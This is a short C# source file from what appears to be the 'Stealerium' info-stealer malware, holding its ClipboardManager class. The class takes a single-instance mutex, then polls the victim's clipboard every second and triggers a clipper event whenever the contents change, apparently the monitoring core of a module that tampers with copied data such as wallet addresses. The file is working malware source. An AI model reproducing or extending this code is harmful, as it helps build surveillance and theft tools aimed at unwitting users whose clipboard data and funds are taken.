using System;
using System.Threading;
using Stealerium.Clipper;

namespace Stealerium.Helpers
{
    internal sealed class ClipboardManager
    {
        // Current clipboard content
        private static string _prevClipboard = "";
        public static string ClipboardText = "";
        public static Thread MainThread = new Thread(Run);
        public const string clipper_mutex = "clipper_mutex";
        // Run clipboard checker
        private static void Run()
        {
            try
            {
                Mutex m = Mutex.OpenExisting(ClipboardManager.clipper_mutex);
                return;
            }
            catch (WaitHandleCannotBeOpenedException)
            {
                new Mutex(false, clipper_mutex);
            }
            try
            {
                while (true)
                {
                    Thread.Sleep(1000);
                    ClipboardText = Clipboard.GetText();
                    if (ClipboardText == _prevClipboard) continue;
                    _prevClipboard = ClipboardText;
                    EventManager.Action();
                }
            }catch(Exception ex)
            {
                Logging.LogEx(ex);
            }
        }
    }
}